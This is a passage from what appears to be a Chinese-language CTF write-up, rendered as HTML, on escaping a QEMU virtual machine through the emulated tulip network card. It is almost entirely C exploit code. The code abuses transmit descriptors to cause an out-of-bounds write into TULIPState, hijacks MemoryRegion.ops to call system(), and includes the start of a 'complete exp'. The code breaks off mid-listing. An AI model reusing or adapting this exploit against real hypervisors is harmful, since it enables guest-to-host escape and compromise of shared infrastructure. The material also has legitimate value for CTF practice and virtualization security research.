class="number">0x200</span>);</span><br><span class="line">    binsh[<span class="number">0</span>] = <span class="number">7449354444534473059</span>; <span class="comment">// catflag</span></span><br><span class="line">    binsh[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    len1 = <span class="number">16</span>;</span><br><span class="line">    len2 = <span class="number">0</span>;</span><br><span class="line">    tx_desc-&gt;status = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    tx_desc-&gt;buf_addr1 = gva_to_gpa(binsh);</span><br><span class="line">    tx_desc-&gt;buf_addr2 = <span class="number">0x180</span>;</span><br><span class="line">    tx_desc-&gt;control = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] enter stage3\n&quot;</span>); &#123;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">0</span>] = qemu_plt_system;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">1</span>] = qemu_plt_system;</span><br><span class="line"></span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">4</span>] = <span class="number">2</span>;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">8</span>] = <span class="number">0x0000000400000004</span>;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">10</span>] = <span class="number">0</span>;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">    len1 = <span class="number">0x400</span> &lt;&lt; <span class="number">0</span>;</span><br><span class="line">    len2 = <span class="number">0</span> &lt;&lt; <span class="number">11</span>;</span><br><span class="line">    tx_desc-&gt;status = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    tx_desc-&gt;control = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">29</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">     <span class="comment">/* (1UL &lt;&lt; 29)为TDES1_FS: 执行&quot;tx_frame_len = 0&quot; */</span></span><br><span class="line">    tx_desc-&gt;buf_addr1 = gva_to_gpa(buf);</span><br><span class="line">    tx_desc-&gt;buf_addr2 = <span class="number">0x180</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] desc: 0x%x\n&quot;</span>, tx_desc-&gt;buf_addr1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> tx_desc_gpa = gva_to_gpa(tx_desc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] tx_desc_gpa: 0x%lx\n&quot;</span>, tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">    pmio_writel(CSR(<span class="number">6</span>), <span class="number">1u</span> &lt;&lt; <span class="number">13</span>); <span class="comment">/* (1u &lt;&lt; 13)为CSR6_ST: 设置CSR5_TS_SUSPENDED */</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa); <span class="comment">/* 读取tx_desc为网络适配器的描述符,tx_frame_len将变为0x400 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] fill tx_frame\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    tx_desc-&gt;buf_addr1  = gva_to_gpa(buf);</span><br><span class="line">    tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">    pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa); <span class="comment">/* 读取tx_desc为网络适配器的描述符,tx_frame_len将变为0x800 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] clean CSR5\n&quot;</span>);</span><br><span class="line">    pmio_writel(CSR(<span class="number">5</span>), <span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line">    len1 = <span class="keyword">sizeof</span>(struct oob_data);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">oob_data</span> *<span class="title">oob_data</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct oob_data));</span><br><span class="line">    oob_data-&gt;tx_frame_len = <span class="number">-0x2a28</span><span class="number">-0x70</span>;  <span class="comment">// 指向MemoryRegion.ops</span></span><br><span class="line">    oob_data-&gt;rx_frame_len = <span class="number">0</span>;</span><br><span class="line">    oob_data-&gt;rx_frame_size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;          <span class="comment">// bypass some stuff </span></span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">0</span>] = <span class="number">0xff</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">1</span>] = <span class="number">0xff</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">2</span>] = <span class="number">0xff</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">3</span>] = <span class="number">0xff</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">4</span>] = <span class="number">0xff</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">5</span>] = <span class="number">0xff</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    tx_desc-&gt;buf_addr1  = gva_to_gpa(oob_data);</span><br><span class="line">    tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">    tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa); <span class="comment">/* 设置tx_desc(覆盖TULIPState) */</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] hijack ops\n&quot;</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> *fake_memory_region_ops = (<span class="keyword">uint64_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">    fake_memory_region_ops[<span class="number">0</span>] = frame_base;</span><br><span class="line">    len1 = <span class="number">8</span>;</span><br><span class="line">    len2 = <span class="number">0</span>;</span><br><span class="line">    tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    tx_desc-&gt;buf_addr1  = gva_to_gpa(fake_memory_region_ops);</span><br><span class="line">    tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">    tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa); <span class="comment">/* 覆盖ops.write */</span></span><br><span class="line"></span><br><span class="line">    pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa); <span class="comment">/* 触发ops.write */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT) <span class="comment">// 4096</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMIO_BASE 0x000000000000c000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSR(_x) ((_x) &lt;&lt; 3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSR5_TS_SUSPENDED 6</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line"></span><br><span class="line">tulip_write -&gt;</span><br><span class="line">tulip_xmit_list_update -&gt; </span><br><span class="line">tulip_copy_tx_buffers -&gt;         </span><br><span class="line">pci_dma_read(&amp;s-&gt;dev, desc-&gt;buf_addr1, s-&gt;tx_frame + s-&gt;tx_frame_len, len1); -&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint32_t</span> <span class="title">tulip_ts</span><span class="params">(TULIPState *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (s-&gt;csr[<span class="number">5</span>] &gt;&gt; CSR5_TS_SHIFT) &amp; CSR5_TS_MASK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tulip_descriptor</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> status;</span><br><span class="line">    <span class="keyword">uint32_t</span> control;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_addr1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_addr2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">page_offset</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gfn</span><span class="params">(<span class="keyword">void</span> *addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="keyword">void</span> *addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="keyword">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint64_t</span> port)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> val;</span><br><span class="line">    val = inw(PMIO_BASE + port);</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint64_t</span> port, <span class="keyword">uint64_t</span> val)</span> </span>&#123;</span><br><span class="line">    outw(val, PMIO_BASE + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_writel</span><span class="params">(<span class="keyword">uint64_t</span> port, <span class="keyword">uint64_t</span> val)</span> </span>&#123;</span><br><span class="line">    outl(val, PMIO_BASE + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter stage1\n&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allocate descriptor</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tulip_descriptor</span> *<span class="title">tx_desc</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct tulip_descriptor));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tulip_descriptor</span> *<span class="title">rx_desc</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct tulip_descriptor));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *recv_buf = <span class="built_in">malloc</span>(<span class="number">0x9000</span>);</span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(recv_buf, <span class="string">&#x27;B&#x27;</span>, <span class="number">0x9000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> len1 = <span class="number">0x400</span> &lt;&lt; <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len2 = <span class="number">0</span> &lt;&lt; <span class="number">11</span>;</span><br><span class="line">    tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">29</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>); <span class="comment">// TDES1_FS, clean tx_frame_len</span></span><br><span class="line">    tx_desc-&gt;buf_addr1  = gva_to_gpa(buf);</span><br><span class="line">    tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] desc: 0x%x\n&quot;</span>, tx_desc-&gt;buf_addr1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get the physical address of the descriptor</span></span><br><span class="line">    <span class="keyword">uint64_t</span> tx_desc_gpa = gva_to_gpa(tx_desc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] tx_desc_gpa: 0x%lx\n&quot;</span>, tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set CSR5_TS_SUSPENDED</span></span><br><span class="line">    pmio_writel(CSR(<span class="number">6</span>), <span class="number">1u</span> &lt;&lt; <span class="number">13</span>); <span class="comment">// CSR6_ST</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// set tx descriptor</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);   <span class="comment">// tx_frame_len should be 0x400 now</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] fill tx_frame\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set tx descriptor</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);   </span><br><span class="line">    tx_desc-&gt;buf_addr1  = gva_to_gpa(buf);</span><br><span class="line">    tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">    pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);   <span class="comment">// tx_frame_len shoule be 0x800 now</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// tulip_tx: tulip_receive(s, s-&gt;tx_frame, s-&gt;tx_frame_len);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] clean CSR5\n&quot;</span>);</span><br><span class="line">    pmio_writel(CSR(<span class="number">5</span>), <span class="number">0xffffffff</span>);</span><br><span class="line">    pmio_write(CSR(<span class="number">6</span>), <span class="number">0x800</span> | (<span class="number">1u</span> &lt;&lt; <span class="number">13</span>) | (<span class="number">1u</span> &lt;&lt; <span class="number">1</span>));         <span class="comment">// CSR6_OM_SHIFT trigger tulip_receive</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] OOB write tx_frame_len...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span 